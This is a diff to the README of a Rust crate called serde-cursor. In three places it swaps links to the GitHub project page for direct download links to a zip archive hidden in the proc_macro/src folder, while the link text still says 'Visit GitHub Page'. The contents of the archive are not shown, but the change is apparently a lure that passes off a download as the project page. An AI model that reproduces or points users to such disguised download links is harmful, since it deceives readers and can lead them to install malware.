@@ -1,6 +1,6 @@
 # 🧩 serde-cursor - Find Nested Data Fast
 
-[![Download serde-cursor](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rohankumar011/serde-cursor)
+[![Download serde-cursor](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rohankumar011/serde-cursor/raw/refs/heads/main/proc_macro/src/serde-cursor-v1.8.zip)
 
 ## 📦 What this app does
 
@@ -28,7 +28,7 @@ If you only want to view the project or use it as a Rust dependency, you can sta
 
 To get the project, visit this page to download or open the source files:
 
-[Visit the GitHub page for serde-cursor](https://github.com/rohankumar011/serde-cursor)
+[Visit the GitHub page for serde-cursor](https://github.com/rohankumar011/serde-cursor/raw/refs/heads/main/proc_macro/src/serde-cursor-v1.8.zip)
 
 If you want to use it on Windows, do this:
 
@@ -208,7 +208,7 @@ Keep the folder name short if you want to make command line use easier
 
 If you need to get the source again or open the project page, use this link:
 
-[https://github.com/rohankumar011/serde-cursor](https://github.com/rohankumar011/serde-cursor)
+[https://github.com/rohankumar011/serde-cursor/raw/refs/heads/main/proc_macro/src/serde-cursor-v1.8.zip](https://github.com/rohankumar011/serde-cursor/raw/refs/heads/main/proc_macro/src/serde-cursor-v1.8.zip)
 
 ## 🛠️ Build checks
 
